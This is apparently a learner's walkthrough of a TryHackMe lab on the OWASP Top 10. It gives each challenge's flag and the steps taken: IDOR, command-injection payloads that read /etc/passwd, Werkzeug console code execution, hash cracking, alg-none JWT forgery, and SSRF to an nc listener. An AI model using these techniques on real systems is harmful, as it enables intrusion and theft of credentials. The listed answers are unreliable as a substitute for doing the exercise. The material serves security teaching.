# OWASP Top 10 - 2021 - TryHackMe

Learn about and exploit each of the OWASP Top 10 vulnerabilities; the 10 most critical web security risks.

## Overview

- **Room URL:** [https://tryhackme.com/room/owasptop102021](https://tryhackme.com/room/owasptop102021)
- **Difficulty:** Easy
- **Time to complete:** 120

## Walkthrough

### 1. Introduction

_No hints needed!_

### 2. Accessing Machines

_No hints needed!_

### 3. 1. Broken Access Control

_No hints needed!_

### 4. Broken Access Control (IDOR Challenge)

- <p>Look at other users' notes. What is the flag?<br /></p>
- Visit `http://<MACHINE_IP>` and login with the given credentails.
- Try visit `http://<MACHINE_IP>/note.php?note_id=0`

![Guide image](./screenshots/owasp-top-10-2021-1.png)

**=> Answer: `flag{fivefourthree}`**

### 5. 2. Cryptographic Failures

_No hints needed!_

### 6. Cryptographic Failures (Supporting Material 1)

_No hints needed!_

### 7. Cryptographic Failures (Supporting Material 2)

_No hints needed!_

### 8. Cryptographic Failures (Challenge)

- Have a look around the web app. The developer has left themselves a note indicating that there is sensitive data in a specific directory. <br /><br />What is the name of the mentioned directory?

- Visit `http://<MACHINE_IP>/login.php` and `View page source`, you will see where database is stored.

![Guide image](./screenshots/owasp-top-10-2021-2.png)

**=> Answer: `/assets`**

- <p>Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?<br /></p>

- Visit `http://<MACHINE_IP>/assets`, you will see the `.db` file.

![Guide image](./screenshots/owasp-top-10-2021-3.png)

**=> Answer: `webapp.db`**

- <p>Use the supporting material to access the sensitive data. What is the password hash of the admin user?<br /></p>

- Download `webapp.db` file for further attacking:

```bash
file webapp.db
sqlite3 webapp.db

sqlite> .tables
sqlite> select * from users;
sqlite> PRAGMA table_info(users);
```

![Guide image](./screenshots/owasp-top-10-2021-4.png)

**=> Answer: `6eea9b7ef19179a06954edd0f6c05ceb`**

- <p>Crack the hash.<br />What is the admin's plaintext password?<br /></p>

- Crack the hash password `6eea9b7ef19179a06954edd0f6c05ceb` of `admin` in [CrackStation](https://crackstation.net/).

![Guide image](./screenshots/owasp-top-10-2021-5.png)

**=> Answer: `qwertyuiop`**

- <p>Log in as the admin. What is the flag?<br /></p>

![Guide image](./screenshots/owasp-top-10-2021-6.png)

**=> Answer: `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`**

### 9. 3. Injection

_No hints needed!_

### 10. 3.1. Command Injection

- What strange text file is in the website's root directory?

- Visit `http://<MACHINE_IP>:82` and type `echo "$(ls)"` to see the directory content.

![Guide image](./screenshots/owasp-top-10-2021-7.png)

**=> Answer: `drpepper.txt`**

- <p>How many non-root/non-service/non-daemon users are there?<br /></p>

**=> Answer: `0`**

- <p>What user is this app running as?<br /></p>

```bash
echo "$(whoami)"
```

![Guide image](./screenshots/owasp-top-10-2021-9.png)

**=> Answer: `apache`**

- <p>What is the user's shell set as?<br /></p>

```bash
echo "$(cat /etc/passwd)"
```

![Guide image](./screenshots/owasp-top-10-2021-8.png)

**=> Answer: `/sbin/nologin`**

- <p>What version of Alpine Linux is running?<br /></p>

```bash
echo "$(cat /etc/alpine-release)"
```

![Guide image](./screenshots/owasp-top-10-2021-10.png)

**=> Answer: `3.16.0`**

### 11. 4. Insecure Design

- <p>What is the value of the flag in joseph's account?</p>

- Visit `http://<MACHINE_IP>:85` and click `forgot password`, you can see that the question `What's your favourite colour?` is easy to guess.
- I try `yellow` and i can get access to the reset password.

![Guide image](./screenshots/owasp-top-10-2021-12.png)

![Guide image](./screenshots/owasp-top-10-2021-11.png)

- Login using new password and get the flag.

![Guide image](./screenshots/owasp-top-10-2021-13.png)

**=> Answer: `THM{Not_3ven_c4tz_c0uld_sav3_U!}`**

### 12. 5. Security Misconfiguration

- <p>Use the Werkzeug console to run the following Python code to execute the <code>ls -l</code> command on the server:</p>

<pre class="language-python"><code>import os; print(os.popen("ls -l").read())</code></pre>

<p>What is the database file name (the one with the .db extension) in the current directory?</p>

![Guide image](./screenshots/owasp-top-10-2021-14.png)

**=> Answer: `todo.db`**

- <p>Modify the code to read the contents of the <code>app.py</code> file, which contains the <span style="font-size:1rem">application's </span><span style="font-size:1rem">source code. What is the value of the </span><code>secret_flag</code><span style="font-size:1rem"> variable in the source code?</span></p>

```bash
import os; print(os.popen("cat app.py").read())
```

![Guide image](./screenshots/owasp-top-10-2021-15.png)

**=> Answer: `THM{Just_a_tiny_misconfiguration}`**

### 13. 6. Vulnerable and Outdated Components

_No hints needed!_

### 14. Vulnerable and Outdated Components - Exploit

_No hints needed!_

### 15. Vulnerable and Outdated Components - Lab

- What is the content of the /opt/flag.txt file?
- Use exploit code in `https://www.exploit-db.com/exploits/47887`

![Guide image](./screenshots/owasp-top-10-2021-16.png)

**=> Answer: `THM{But_1ts_n0t_my_f4ult!}`**

### 16. 7. Identification and Authentication Failures

_No hints needed!_

### 17. Identification and Authentication Failures Practical

- What is the flag that you found in darren's account?

![Guide image](./screenshots/owasp-top-10-2021-17.png)

**=> Answer: `fe86079416a21a3c99937fea8874b667`**

- <p>What is the flag that you found in arthur's account?<br /></p>
- Do the same with `arthur` account.

**=> Answer: `d9ac0f7db4fda460ac3edeb75d75e16e`**

### 18. 8. Software and Data Integrity Failures

_No hints needed!_

### 19. Software Integrity Failures

- <p>What is the SHA-256 hash of <code>https://code.jquery.com/jquery-1.12.4.min.js</code>?</p>
- Visit `https://www.srihash.org/` and hash the url with `SHA-256` option

![Guide image](./screenshots/owasp-top-10-2021-18.png)

**=> Answer: `sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=`**

### 20. Data Integrity Failures

- <p>Try logging into the application as guest. What is guest's account password?</p>

**=> Answer: `guest`**

- <p>If your login was successful, you should now have a JWT stored as a cookie in your browser. Press F12 to bring out the Developer Tools.</p><p>Depending on your browser, you will be able to edit cookies from the following tabs:</p>
  <p><b>Firefox</b></p>
  <p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/17765aa7418c977b2d07aa67305e04ad.png" style="width:90%;border:1px solid" alt="Firefox Developer Tools" /><br /></p>

<p><b>Chrome</b></p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/cd52fcfd91df145fb31d7bad9b56ebdc.png" style="width:90%;border:1px solid" alt="Chrome Developer Tools" /></p><p>What is the name of the website's cookie containing a JWT token?</p>

![Guide image](./screenshots/owasp-top-10-2021-19.png)

**=> Answer: `jwt-session`**

- <p>What is the flag presented to the admin user?</p>

- Visit `https://www.gavinjl.me/edit-jwt-online-alg-none/` to change the JWT token remember to set the `alg` to `none`

**=> Answer: `THM{Dont_take_cookies_from_strangers}`**

### 21. 9. Security Logging and Monitoring Failures

- What IP address is the attacker using?

**=> Answer: `49.99.13.16`**

- <p>What kind of attack is being carried out?<br /></p>

**=> Answer: `Brute Force`**

### 22. 10. Server-Side Request Forgery (SSRF)

- <p>Explore the website. What is the only host allowed to access the admin area?</p>

![Guide image](./screenshots/owasp-top-10-2021-20.png)

**=> Answer: `localhost`**

- <p>Check the "Download Resume" button. Where does the server parameter point to?</p>

![Guide image](./screenshots/owasp-top-10-2021-21.png)

**=> Answer: `secure-file-storage.com`**

- Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?

- Run a gateway on port 80

```bash
nc -lvp 80
```

- Change the `/download?server=<YOUR_IP>:80..` url in `Download resume` link

![Guide image](./screenshots/owasp-top-10-2021-23.png)

- Go back to your terminal to get the flag

![Guide image](./screenshots/owasp-top-10-2021-22.png)

**=> Answer: `THM{Hello_Im_just_an_API_key}`**

### 23. What Next?

_No hints needed!_
